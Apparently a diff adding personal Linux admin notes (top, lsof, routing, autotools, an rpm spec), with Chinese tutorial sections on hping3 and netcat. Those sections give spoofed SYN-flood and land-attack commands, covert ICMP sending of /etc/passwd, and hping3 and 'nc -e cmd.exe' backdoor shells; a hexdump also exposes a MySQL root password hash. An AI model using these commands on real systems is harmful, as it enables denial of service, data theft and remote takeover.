+ 1882 geek   25   0 2485m 1.7g  26m S    0 21.7  22:38.97 /usr/sbin/gagent -l 0 -u pre
+
+** Quit Top Command After a Specified Number of Iterations Using top -n
+
+Until you press q, top continuously displays the output. If you would like to view only a certain iteration and want the top to exit automatically use -n option as shown below.
+
+The following example will show 2 iterations of unix top command output and exit automatically
+
+$ top -n 2
+
+** Executing Unix Top Command in Batch Mode
+
+If you want to execute top command in the batch mode use option -b as shown below.
+
+$ top -b -n 1
+
+Note: This option is very helpful when you want to capture the unix top command output to a readable text file as we discussed earlier.
+11. Split Top Output into Multiple Panels – Press A
+
+To display multiple views of top command output on the terminal, press A. You can cycle through these windows using ‘a’. This is very helpful, when you can sort the output on multiple windows using different top output columns.
+12. Get Top Command Help from Command Line and Interactively
+
+** Decrease Number of Processes Displayed in Top Output – Press n
+
+Press n in the Interactive mode, which prompts for a number and shows only that. Following example will display only 2 process as a time.
+
+Maximum tasks = 0, change to (0 is unlimited): 2
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
+ 1309 geek   23   0 2483m 1.7g  27m S    0 21.8  45:31.32 gagent
+ 1882 geek   25   0 2485m 1.7g  26m S    0 21.7  22:38.97 gagent
+
+** Toggle Top Header to Increase Number of Processes Displayed
+
+By default top displays total number process based on the window height. If you like to see additional process you might want to eliminate some of the top header information.
+
+Following is the default header information provided by top.
+
+top - 23:47:32 up 179 days,  3:36,  1 user,  load average: 0.01, 0.03, 0.00
+Tasks:  67 total,   1 running,  66 sleeping,   0 stopped,   0 zombie
+Cpu(s):   0.7% user,   1.2% system,   0.0% nice,  98.0% idle
+Mem:   1017136k total,   954652k used,    62484k free,   138280k buffers
+Swap:  3068404k total,    22352k used,  3046052k free,   586576k cached
+
+    Press l – to hide / show the load average. 1st header line.
+    Press t – to hide / show the CPU states. 2nd and 3rd header line.
+    Press m – to hide / show the memory information. 4th and 5th line.
+
+** Save Top Configuration Settings – Press W
+
+If you’ve made any interactive top command configurations suggested in the above examples, you might want to save those for all future top command output. Once you’ve saved the top configuration, next time when you invoke the top command all your saved top configuration options will be used automatically.
+
+To save the top configuration, press W, which will write the configuration files to ~/.toprc. This will display the write confirmation message as shown below.
+
+top - 23:47:32 up 179 days,  3:36,  1 user,  load average: 0.01, 0.03, 0.00
+Tasks:  67 total,   1 running,  66 sleeping,   0 stopped,   0 zombie
+Cpu(s):   0.7% user,   1.2% system,   0.0% nice,  98.0% idle
+Mem:   1017136k total,   954652k used,    62484k free,   138280k buffers
+Swap:  3068404k total,    22352k used,  3046052k free,   586576k cached
+Wrote configuration to '/home/ramesh/.toprc'
+
+* lsof
+14. Lsof
+
+Lsof stands for ls open files, which will list all the open files in the system. The open files include network connection, devices and directories. The output of the lsof command will have the following columns:
+
+    COMMAND process name.
+    PID process ID
+    USER Username
+    FD file descriptor
+    TYPE node type of the file
+    DEVICE device number
+    SIZE file size
+    NODE node number
+
+    NAME full path of the file name.
+
+To view all open files of the system, execute the lsof command without any parameter as shown below.
+
+# lsof | more
+COMMAND     PID       USER   FD      TYPE     DEVICE      SIZE       NODE NAME
+init          1       root  cwd       DIR        8,1      4096          2 /
+init          1       root  rtd       DIR        8,1      4096          2 /
+init          1       root  txt       REG        8,1     32684     983101 /sbin/init
+init          1       root  mem       REG        8,1    106397     166798 /lib/ld-2.3.4.so
+init          1       root  mem       REG        8,1   1454802     166799 /lib/tls/libc-2.3.4.so
+init          1       root  mem       REG        8,1     53736     163964 /lib/libsepol.so.1
+init          1       root  mem       REG        8,1     56328     166811 /lib/libselinux.so.1
+init          1       root   10u     FIFO       0,13                  972 /dev/initctl
+migration     2       root  cwd       DIR        8,1      4096          2 /
+skipped..
+
+To view open files by a specific user, use lsof -u option to display all the files opened by a specific user.
+
+# lsof -u ramesh
+vi      7190 ramesh  txt    REG        8,1   474608   475196 /bin/vi
+sshd    7163 ramesh    3u  IPv6   15088263               TCP dev-db:ssh->abc-12-12-12-12.
+
+To list users of a particular file, use lsof as shown below. 
+In this example, it displays all users who are currently using vi.
+
+# lsof /bin/vi
+COMMAND  PID  USER    FD   TYPE DEVICE   SIZE   NODE NAME
+vi      7258  root   txt    REG    8,1 474608 475196 /bin/vi
+vi      7300  ramesh txt    REG    8,1 474608 475196 /bin/vi
+
+* hping3
+Hping3介绍
+
+　　Hping是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是Hping3，支持使用tcl脚本自动化地调用其API。Hping是安全审计、防火墙测试等工作的标配工具。
+
+　　Hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。
+
+　　而Nmap团队也开发了一款类似的工具Nping，集成在Nmap的安装包中。
+3.2  Hping3功能
+
+　　Hping3主要有以下典型功能应用：
+3.2.1  防火墙测试
+
+　　使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html
+
+　　测试防火墙对ICMP包的反应、是否支持Traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。
+
+　　例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。
+
+hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
+
+ 
+3.2.2  端口扫描
+
+　　Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。
+
+　　以下示例可用于探测目标机的80端口是否开放：
+
+hping3 -I eth0  -S 192.168.10.1 -p 80
+
+　　其中-Ieth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。
+
+　　hping3支持非常丰富的端口探测方式，Nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。
+
+　　当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。
+
+ 
+3.2.3  Idle扫描
+
+　　Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。
+
+　　该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。
+
+
+ 
+3.2.4  拒绝服务攻击
+
+　　使用Hping3可以很方便构建拒绝服务攻击。
+
+　　比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
+
+hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
+
+　　其他攻击如smurf、teardrop、land attack等也很容易构建出来。
+
+ 
+3.2.5  文件传输
+
+　　Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。
+
+　　实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。
+
+　　在接收端开启服务：
+
+hping3 192.168.1.159--listen signature --safe  --icmp
+
+　　监听ICMP包中的签名，根据签名解析出文件内容。
+
+　　在发送端使用签名打包的ICMP包发送文件：
+
+hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
+
+　　将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。
+
+ 
+3.2.6  木马功能
+
+　　如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与Netcat的后门功能类似。
+
+　　示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。
+
+　　在木马启动端：
+
+hping3 192.168.10.66--listen signature --safe --udp -p 53 |/bin/sh
+
+　　在远程控制端：
+
+echo ls >test.cmd
+
+hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd
+
+　　将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。
+
+　　当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。
+
+* netcat
+2     Netcat
+
+核心应用：完成网络中各种辅助操作，被称作TCPIP的瑞士军刀
+
+
+2.1  Netcat简介
+
+　　Netcat用于从TCP/UDP连接中读取或发送网络数据。cat是Linux中查看或连接文件的命令，所以netcat本意为从网络上查看文件内容。而Netcat的作者Hobbit为它添加了非常丰富的功能，使它几乎能够完成网络操作中各式各样的操作，所以Netcat在网络安全领域被称作“TCPIP的瑞士军刀”（"Swiss-army knife forTCP/IP"）。
+
+　　Netcat稳定版1.10由Hobbit在1996年3月发布（开源软件），之后作者没有再对其进行维护，但该工具十多年来依然在被广泛地使用，而且基于Netcat的各种衍生工具也层出不穷，他们在很多方面增强或扩展了Netcat的功能。
+
+　　Nmap团队开发了Ncat作为Netcat的升级版本，增加了更多的功能，让其更能适应现代网络环境的需求。
+2.2  Netcat功能
+2.2.1  网络连接
+
+　　类似于Telnet的功能，使用Netcat能够简便地登录到目标机上开放的端口。
+
+　　例如，
+
+nc mail.server.net 25
+
+　　向mail.server.net的25号TCP端口发起连接。
+
+ 
+2.2.2  端口扫描
+
+　　Netcat同样可以进行端口扫描，但与Nmap相比，它的性能及使用范围都很有限。如果只想简单地探测几个端口的开放状态，使用Netcat也可行。
+
+　　端口扫描格式如下：
+
+nc –v –z hostnameport[s]
+
+　　实例：
+
+nc –v –z www.yahoo.com 80 22
+
+　　扫描yahoo网站的80、22端口，判断其是否开放。
+
+ 
+2.2.3  文件传输
+
+　　Netcat最初的用途就是文件传输，它可以像Cat命令一样将读取的文件重定向到网络上的另外的文件。Netcat在网络应用中既可以当做服务器端，开启本机一个监听端口，也可以作为客户端向其他服务器端口发起连接。所以，文件传输，即是在两端分别运行Netcat。
+
+　　在接受端，运行Netcat开启端口监听服务。
+
+nc –L –p 4444 >receivedfile.zip 
+
+　　此处-L启动监听模式（即作为服务器端），开启4444端口，将接受到的数据写入到文件somefile.zip中。
+
+　　而在发送端，只需连接该服务器端开放的端口，并选择需要发送的文件。
+
+nc 192.168.1.43 4444< testfile.zip
+
+　　使用<符号输入testfile.zip文件，并向目标机的4444端口发起连接。在建立连接成功后，发送端会将文件传送到接收端，接受端将收到的数据写入receivedfile.zip文件。整个过程，比较类似于cat命令，因为具体的网络传输过程由Netcat负责。
+
+ 
+2.2.4  开启后门
+
+　　Netcat甚至也可以用作后门程序。如果用户已经侵入到一台计算机，那么让该计算机在开机后（或其他条件下）自动启动Netcat，打开指定的端口，等待用户连接，在连接成功后执行特定程序（如cmd.exe，以便远程执行命令）。
+
+nc –L –p 4444 –e cmd.exe
+
+　　以监听模式启动Netcat，开启TCP端口4444，在与客户端成功建立连接后，执行cmd.exe程序（-e cmd.exe，此处为用户打开命令行执行窗口，用户可以通过命令操作此计算机）。
+
+　　在客户端，直接连接目标机的4444端口即可。
+
+nc 192.168.1.43 4444
+
+　　连接后，客户端可以接收到一个命令行窗口。
+
+ 
+2.2.5  端口转发
+
+　　端口转发（PortForwarding）也是Netcat比较实用的用法。先将Netcat作为服务器接收其他主机的连接，然后将连接的数据转发另外的目标机端口。
+
+　　比如：
+
+mkfifo backpipe
+
+nc -l 12345  0<backpipe | nc www.google.com 801>backpipe
+
+　　比如，此处开启端口12345，作为www.google.com的代理。其他无法直接登陆google的用户可以通过此代理端口来与google进行交互。这里创建了一个fifo，是为实现双向数据通讯，因为管道运算符本身是单向的。
+
+ 
+2.2.6  标语提取
+
+　　标语提取（BannerGrabbing）的含义是抓取应用程序在建立连接后打印的标语提示信息，例如建立FTP连接后，FTP服务器可能打印出提示信息：FTP xxx.xxx等数据。
+
+　　所以，根据服务器打印的信息，有时可以推断出对方服务程序的详细版本。这也是Nmap进行服务与版本侦测采用方法。
+
+　　例如，首先创建一份文件，包含以下文本：
+[plain] view plain
+copy
+
+HEAD / HTTP/1.0  
+<return>  
+<return>  
+
+　　然后，将此文件发送到目标服务器的80端口，诱发对方发送HTTP首部数据。
+
+cat file>nc -vv -w 2 www.cnn.com 80 >output.txt
+
+　　然后可从output.txt查看到对方的发送的HEAD的标语信息。
+
+ 
+
+ 
+2.2.7  其他功能
+
+　　Netcat其他常用的功能：
+支持完全的DNS转发、逆向检查
+支持用户指定源端口
+支持用户指定源端IP地址
+内置宽松源路由能力（loosesource-routing capability）
+慢速发送模式，可指定每隔多少秒发送一行文本
+将发送或接收数据以16进制格式导出
+* 查看网卡信息
+linux-19:~ # ethtool eth1
+Settings for eth1:
+        Supported ports: [ TP ]
+        Supported link modes:   10baseT/Half 10baseT/Full
+                                100baseT/Half 100baseT/Full
+                                1000baseT/Full
+        Supports auto-negotiation: Yes
+        Advertised link modes:  10baseT/Half 10baseT/Full
+                                100baseT/Half 100baseT/Full
+                                1000baseT/Full
+        Advertised pause frame use: No
+        Advertised auto-negotiation: Yes
+        Speed: 1000Mb/s
+        Duplex: Full
+        Port: Twisted Pair
+        PHYAD: 1
+        Transceiver: internal
+        Auto-negotiation: on
+        MDI-X: Unknown
+        Supports Wake-on: g
+        Wake-on: d
+        Link detected: yes
+* lspci -vvv
+* ipvsadmin
+  ipvsadm -ln
+* curl
+  
+  -H 指定特定的http header
+  curl -H 'Accept-Languange: en-us:q=2.2250738585072012e-308' http://www.hismarttv.com
+
+* 查看路由表
+  ip route
+
+* man
+  一些命令的没用--help这样的帮助。
+  可以使用man查看其选项说明。
+  例如df命令
+  可以man df，查看其各个选项的使用说明。
+* hexdump
+  很好的一个选项： -C 输出十六进制和对应字符
+#+begin_example
+linux-107:/ # hexdump -C /usr/local/fountain/3rdparty/mysql/mysql/user.MYD
+00000000  05 00 57 00 27 00 00 00  00 00 00 00 fc fb 03 09  |..W.'...........|
+00000010  6c 6f 63 61 6c 68 6f 73  74 04 72 6f 6f 74 2a 44  |localhost.root*D|
+00000020  41 45 36 33 44 33 33 34  32 39 44 35 35 41 32 35  |AE63D33429D55A25|
+00000030  35 33 46 46 03 00 2f 01  ff 03 09 6c 69 6e 75 78  |53FF../....linux|
+00000040  2d 31 30 37 04 72 6f 6f  74 00 02 02 02 02 02 02  |-107.root.......|
+00000050  02 02 02 02 02 02 02 02  02 02 02 02 02 02 02 02  |................|
+00000060  02 02 02 02 02 02 01 00  03 00 2f 01 ff 03 09 31  |........../....1|
+00000070  32 37 2e 30 2e 30 2e 31  04 72 6f 6f 74 00 02 02  |27.0.0.1.root...|
+00000080  02 02 02 02 02 02 02 02  02 02 02 02 02 02 02 02  |................|
+00000090  02 02 02 02 02 02 02 02  02 02 01 00 03 00 2b 01  |..............+.|
+000000a0  ff 03 09 6c 6f 63 61 6c  68 6f 73 74 00 00 01 01  |...localhost....|
+#+end_example  
+* 子接口
+    **添加子接口IP
+
+    #ifconfig eth2:1 192.168.4.23 netmask 255.255.255.0 up
+
+    **去掉子接口IP
+
+    #ifconfig eth2:1 192.168.4.23 netmask 255.255.255.0 down
+
+    **指定原IP ping
+
+    #ping -I 192.168.4.23 -c 192.168.12.100
+
+* linux系统信息
+用硬件检测程序kuduz探测新硬件：service kudzu start ( or restart)
+ 查看CPU信息：cat /proc/cpuinfo
+ 查看板卡信息：cat /proc/pci
+ 查看PCI信息：lspci (相比cat /proc/pci更直观）
+ 查看内存信息：cat /proc/meminfo
+ 查看USB设备：cat /proc/bus/usb/devices
+ 查看交换分区信息: cat /proc/swap
+ 查看内存使用情况： free
+ 查看键盘和鼠标:cat /proc/bus/input/devices
+ 查看系统硬盘信息和使用情况：fdisk & disk - l & df
+ 查看各设备的中断请求(IRQ):cat /proc/interrupts
+ 查看系统体系结构：uname -a
+查看Linux的版本： cat /etc/issue  或 cat /proc/version 
+查看CPU信息（型号）： # cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c
+查看CPU实际上核的数： # cat /proc/cpuinfo | grep physical | uniq -c
+当前CPU运行在32bit模式下:# getconf LONG_BIT
+结果大于0, 说明支持64bit计算. lm指long mode, 支持lm则是64bit: # cat /proc/cpuinfo | grep flags | grep ' lm ' | wc -l
+查看当前操作系统发行版信息：  # cat /etc/issue | grep Linux
+查看机器型号： # dmidecode | grep "Product Name" 
+查看网卡信息： # dmesg | grep -i eth
+
+查看进程开始时间、结束时间、运行时间：ps -o stime,etime  28486 （SPID)
+
+
+系统 
+# uname -a               # 查看内核/操作系统/CPU信息
+# head -n 1 /etc/issue   # 查看操作系统版本
+# cat /proc/cpuinfo      # 查看CPU信息
+# hostname               # 查看计算机名
+# lspci -tv              # 列出所有PCI设备
+# lsusb -tv              # 列出所有USB设备
+# lsmod                  # 列出加载的内核模块
+# env                    # 查看环境变量
+
+资源 
+# free -m                # 查看内存使用量和交换区使用量
+# df -h                  # 查看各分区使用情况
+# du -sh <目录名>        # 查看指定目录的大小
+# grep MemTotal /proc/meminfo   # 查看内存总量
+# grep MemFree /proc/meminfo    # 查看空闲内存量
+# uptime                 # 查看系统运行时间、用户数、负载
+# cat /proc/loadavg      # 查看系统负载
+
+磁盘和分区 
+# mount | column -t      # 查看挂接的分区状态
+# fdisk -l               # 查看所有分区
+# swapon -s              # 查看所有交换分区
+# hdparm -i /dev/hda     # 查看磁盘参数(仅适用于IDE设备)
+# dmesg | grep IDE       # 查看启动时IDE设备检测状况
+
+网络 
+# ifconfig               # 查看所有网络接口的属性
+# iptables -L            # 查看防火墙设置
+# route -n               # 查看路由表
+# netstat -lntp          # 查看所有监听端口
+# netstat -antp          # 查看所有已经建立的连接
+# netstat -s             # 查看网络统计信息
+
+进程 
+# ps -ef                 # 查看所有进程
+# top                    # 实时显示进程状态
+
+用户 
+# w                      # 查看活动用户
+# id <用户名>            # 查看指定用户信息
+# last                   # 查看用户登录日志
+# cut -d: -f1 /etc/passwd   # 查看系统所有用户
+# cut -d: -f1 /etc/group    # 查看系统所有组
+# crontab -l             # 查看当前用户的计划任务
+
+服务 
+# chkconfig --list       # 列出所有系统服务
+# chkconfig --list | grep on    # 列出所有启动的系统服务
+
+程序 
+# rpm -qa                # 查看所有安装的软件包
+* linux 添加静态路由 
+
+linux下静态路由修改命令
+ 方法一：
+ 添加路由
+ route add -net 192.168.0.0/24 gw 192.168.0.1
+ route add -host 192.168.1.1 dev 192.168.0.1
+ 删除路由
+ route del -net 192.168.0.0/24 gw 192.168.0.1
+
+ add 增加路由
+ del 删除路由
+ -net 设置到某个网段的路由
+ -host 设置到某台主机的路由
+ gw 出口网关 IP地址
+ dev 出口网关 物理设备名
+
+ 增 加默认路由
+
+ route add default gw 192.168.0.1
+ 默认路由一条就够了
+
+ route -n 查看路由表
+
+ 方法二：
+ 添加路由
+ ip route add 192.168.0.0/24 via 192.168.0.1
+ ip route add 192.168.1.1 dev 192.168.0.1
+ 删除路由
+ ip route del 192.168.0.0/24 via 192.168.0.1
+
+ add 增加路由
+ del 删除路由
+ via 网关出口 IP地址
+ dev 网关出口 物理设备名
+
+ 增加默认路由
+ ip route add default via 192.168.0.1 dev eth0
+ via 192.168.0.1 是我的默认路由器
+
+ 查看路由信息
+ ip route
+
+保存路由设置，使其在网络重启后任然有效 
+在/etc/sysconfig/network-script/目录下创建名为route- eth0的文件 
+vi /etc/sysconfig/network-script/route-eth0 
+在此文件添加如下格式的内容 
+
+192.168.1.0/24 via 192.168.0.1 
+
+重启网络验证 
+
+ 
+
+ 
+
+/etc/rc.d/init.d/network中有这么几行：
+
+ # Add non interface-specific static-routes.
+ if [ -f /etc/sysconfig/static-routes ]; then
+ grep "^any" /etc/sysconfig/static-routes | while read ignore args ; do
+ /sbin/route add -$args
+ done
+ fi 
+
+ 也就是说，将静态路由加到/etc/sysconfig/static-routes 文件中就行了。
+
+ 
+
+如加入：
+ route add -net 11.1.1.0 netmask 255.255.255.0 gw 11.1.1.1
+
+ 则static-routes的格式为
+ any net 11.1.1.0 netmask 255.255.255.0 gw 11.1.1.1
+
+* 用GCC输出带C源代码注释的汇编列表文件
+  gcc -c -g -Wa,-adlhn ee.c >  ee.anno.s
+  由此生成的ee.anno.s即是ee.c对应的C与汇编混排的列表
+* 自动化编译autotools的使用
+具体操作步骤
+
+ 准备好源码文件helloworld.c 及 Makefile.am文件。
+
+ 执行autoscan生成configure.scan，将configure.scan改为configure.in并修改configure.in
+
+ 然后执行：
+ aclocal
+ autoheader
+ touch README NEWS AUTHORS ChangeLog
+ autoconf
+ automake --add-missing
+ ./configure
+ make
+ ./helloworld ;         ---运行程序
+ make dist            ---制作发布的包
+ make dist            ---制作发布的包并对其进行测试检查
+ make clean        --清除make命令产生的目标文件及可执行文件
+
+automake autoconf 自动化编译说明
+
+利用autotools自动生成makefile文件，自动化编译自己的工程，autotools工具只需要用户输入简单的目标文件、依赖文件、文件目录就可以轻松地生成Makefile了。
+
+首先安装autotools系列工具，包括aclocal、autoscan、automake、autoheader、autoconf等。
+
+可以通过rpm –qa | grep auto来查看各个应用程序，如果没有
+
+yum install automake即可安装。
+
+详细步骤：
+1.建立自己的工程，编写源文件并创建Makefile.am
+
+1)最顶层目录名为模块名 helloworld
+
+源文件放在模块下面的src子目录,例如helloworld/src
+
+2) 在src 下面，创建源文件main.c
+
+3) 在helloworld目录下面创建Makefile.am文件--（为Makefile.in的模板文件，.am扩展名是automake的缩写）,内容如下: 
+
+SUBDIRS=src 
+
+4) 在helloworld/src 目录下创建Makefile.am文件 内容如下：
+
+bin_PROGRAMS=helloworld 
+
+helloworld_SOURCES=main.c 
+
+其中，PROGRAMS表示要产生的是可执行文件，有多个可执行文件文件时，可用空格分开，
+而bin表示可执行文件的安装目录SOURCES表示生成可执行文件需要的源文件，
+有多个源文件时，也用空格分开。比如想生成两个可执行程序helloworld1和helloworld2，那么就需要写成：
+
+bin_PROGRAMS=helloworld1 helloworld2
+
+helloworld1_SOURCES=main1.c 
+
+helloworld2_SOURCES=main2.c 
+2.运行 autoscan --创建autoconf的模板
+
+autoscan      --将生成configure.scan和autoscan.log文件，它会在给定目录及其子目录树中检查源文件，
+若没有给定目录，就在当前目录及其子目录树中进行检查。它会搜索源文件以寻找一般的移植性问题并且创建一个文件configure.scan，通过这个文件我们可以创建autoconf需要的模版文件。
+
+
+1).目录下面生成了configure.scan 文件，利用命令
+
+mv configure.scan configure.in  --将生成的configure.scan更改为autoconf需要的文件模版configure.in
+
+configure.in 文件为autoconf 的模板文件，内容如下所示，其中#行为注释行：
+
+ # -*- Autoconf -*- 
+ # Process this file with autoconf to produce a configure script. 
+
+AC_PREREQ([2.68]) 
+AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS]) 
+AC_CONFIG_SRCDIR([src/main.c]) 
+AC_CONFIG_HEADERS([config.h]) 
+
+ # Checks for programs. 
+AC_PROG_CC 
+ # Checks for libraries. 
+ # Checks for header files. 
+ # Checks for typedefs, structures, and compiler characteristics. 
+ # Checks for library functions. 
+AC_CONFIG_FILES([Makefile 
+src/Makefile]) 
+AC_OUTPUT 
+
+2). 修改configure.in文件
+
+将
+AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS]) 
+修改为：
+AC_INIT(helloworld, 0.1, shaoguangleo@gmail.com)     =--初始化autoconf 
+并添加
+AM_INIT_AUTOMAKE(helloworld, 0.1)     =--初始化automake 必须的宏，这个如果不添加就会导致在autoconf时出错，
+信息大概为configure.in:no proper invocation of AM_INIT_AUTOMAKE was found
+
+3.运行 aclocal -- 复制所有的宏命令
+aclocal 
+备注：configure.in 里面包含了一系列的宏命令，运行aclocal的目的是把工程需要的宏命令展开。
+（aclocal.m4 就是configure.in中用到的宏定义）会生成autom4te.cache文件夹和aclocal.m4文件。
+
+4.运行autoheader --生成配置头文件的模板config.h.in并创建4个必要的文件
+autoheader 
+备注：此时再创建4个必要的文件
+touch README NEWS AUTHORS ChangeLog 
+
+README :描述模块的功能，用法和注意事项 
+NEWS : 描述模块最新的动态 
+AUTHORS : 模块的作者及联系方式 
+ChangeLog : 记录模块的修改历史
+
+上述几个文件可以暂时为空。
+5. automake --add-missing   -- 生成Makefiel.in和所需要的脚本
+
+automake --add-missing   --其中add-missing选项会让automake自动添加一些必须的脚本文件。
+
+6. autoconf -- 生成configure脚本
+
+autoconf     
+--生成configure脚本
+
+7. ./configure -- 生成最终的Makefile文件
+
+./configure 
+
+configure 通常有两个参数
+1) --prefix 用来制定安装目录 linux默认/usr/local
+2) --host 用于交叉编译
+
+8 make =-- 编译
+make 
+
+9.make install
+
+* nohup 
+　nohup命令：如果你正在运行一个进程，而且你觉得在退出帐户时
+  该进程不应结束，那么可以使用nohup命令。该命令可以在你退出帐户/关闭终端之后继续运行相应的进程。nohup就是不挂起的意思( no hang up)。
+  该命令的一般形式为：nohup command &
+
+* 文件重命名
+   开始使用rename命令，很憋气，rename oldname newname 就是不管用。
+   其实rename更适合来批量修改文件名
+   如把当前目录下的以.htm为扩展名的文件改为.html
+   rename .htm .html *
+   如果修改单个文件名可以用mv命令
+   mv oldname newname
+   
+* ^X mode 
+  使用vi时，保存文件使用emacs的方式 C-x C-s
+  进入vim 进入^X mode。
+  这时使用C-q返回正常状态。
+* rpm包制作
+使用脚本将需要安装的文件压缩，打包
+tar czvf /usr/src/packages/SOURCES/nagios-hids.tar.gz nagios/daemon-init nagios/base/nagios nagios/base/nagiostats nagios/sample-config/*.cfg
+然后执行
+rpmbuild -ba nagios-hids.spec
+就会生成对应的RPM包：/usr/src/packages/RPMS/x86_64/nagids-3.5.0-1.x86_64.rpm
+
+nagios-hids.spec：
+#+begin_example
+*定义变量*
+%define name nagids
+%define version 3.5.0
+%define release 1
+%define nsusr nagios
+%define nsgrp nagios
+%define cmdgrp nagiocmd
+%define wwwusr apache
+%define wwwgrp apache
+%define _prefix /usr/local/fountain/nagios
+%define _logdir %{_prefix}/var
+%define _checkresultdir %{_prefix}/var/spool/checkresults
+%define _cfgdir %{_prefix}/etc
+%define _bindir %{_prefix}/bin
+%define _cgidir %{_prefix}/sbin
+%define _libexecdir %{_prefix}/libexec
+%define _plugindir %{_prefix}/plugin
+%define INSTALL_OPTS -o nagios -g nagios
+
+Summary: Host-based Intrusion Detection System (powered by nagios)
+Name: nagids
+Version:%{version}
+Release:%{release}
+Source: nagios-hids.tar.gz
+License: GPL
+Requires: zlib >= 1.2.3
+Packager: Nobody
+Group: Application
+AutoReq: no
+URL: http://hitv.hisense.com
+*安装或者编译时使用的虚拟目录*
+Buildroot:/usr/src/packages/BUILDROOT/%{name}-%{version}-%{release}.%{_arch}
+Vendor: HISENSE MEDIA NETWORKS Co.,LTD
+Distribution: SUSE Linux Enterprise 11 SP1 & SP2
+
+%description 
+Host-based Intrusion Detection System (powered by nagios)
+*预处理脚本*
+%prep
+*解压源码*
+%setup -c
+
+%build
+
+*把软件安装到虚拟的根目录中*
+%install
+install -c -m 775 -d ${RPM_BUILD_ROOT}/%{_libexecdir}
+install -c -m 775 -d ${RPM_BUILD_ROOT}/%{_logdir}
+install -c -m 775 -d ${RPM_BUILD_ROOT}/%{_plugindir}
+install -c -m 775 -d ${RPM_BUILD_ROOT}/%{_logdir}/archives
+install -c -m 775 -d ${RPM_BUILD_ROOT}/%{_checkresultdir}
+
+install -c -m 775 -d ${RPM_BUILD_ROOT}/%{_bindir}
+
+cd nagios
+install -c -m 774 base/nagios ${RPM_BUILD_ROOT}/%{_bindir}
+install -c -m 774 base/nagiostats ${RPM_BUILD_ROOT}/%{_bindir}
+
+install -c -m 755 -d -o root -g root ${RPM_BUILD_ROOT}/etc/rc.d
+install -c -m 755 -o root -g root daemon-init ${RPM_BUILD_ROOT}/etc/rc.d/nagios
+
+install -c -m 775 -d ${RPM_BUILD_ROOT}/%{_cgidir}
+
+for file in `ls cgi/*.cgi`; do \
+    install -c -m 775  $file ${RPM_BUILD_ROOT}/%{_cgidir}; \
+done
+install -c -m 775 $(COMMAND_OPTS) -d ${RPM_BUILD_ROOT}/%{_logdir}/rw
+chmod g+s ${RPM_BUILD_ROOT}/%{_logdir}/rw
+
+install -c -m 775  -d ${RPM_BUILD_ROOT}/%{_cfgdir}
+install -c -m 775  -d ${RPM_BUILD_ROOT}/%{_cfgdir}/objects
+install -c -b -m 664 sample-config/nagios.cfg ${RPM_BUILD_ROOT}/%{_cfgdir}/nagios.cfg
+install -c -b -m 664 sample-config/cgi.cfg ${RPM_BUILD_ROOT}/%{_cfgdir}/cgi.cfg
+install -c -b -m 660 sample-config/resource.cfg ${RPM_BUILD_ROOT}/%{_cfgdir}/resource.cfg
+install -c -b -m 664 sample-config/template-object/templates.cfg ${RPM_BUILD_ROOT}/%{_cfgdir}/objects/templates.cfg
+install -c -b -m 664 sample-config/template-object/commands.cfg ${RPM_BUILD_ROOT}/%{_cfgdir}/objects/commands.cfg
+install -c -b -m 664 sample-config/template-object/contacts.cfg ${RPM_BUILD_ROOT}/%{_cfgdir}/objects/contacts.cfg
+install -c -b -m 664 sample-config/template-object/services.cfg ${RPM_BUILD_ROOT}/%{_cfgdir}/objects/services.cfg
+cd ..
+*清理临时文件*
+%clean
+rm -rf ${RPM_BUILD_ROOT}
+rm -rf ${RPM_BUILD_DIR}/*
+*定义哪些文件或者目录会放入rpm中*
+%files
+/etc/rc.d/nagios
+%dir %{_bindir}
+%{_bindir}/*
+%dir %{_cfgdir}
+%{_cfgdir}/*
+%dir %{_cgidir}
+%{_cgidir}/*
+%dir %{_logdir}
+%dir %{_logdir}/archives
+%dir %{_logdir}/rw
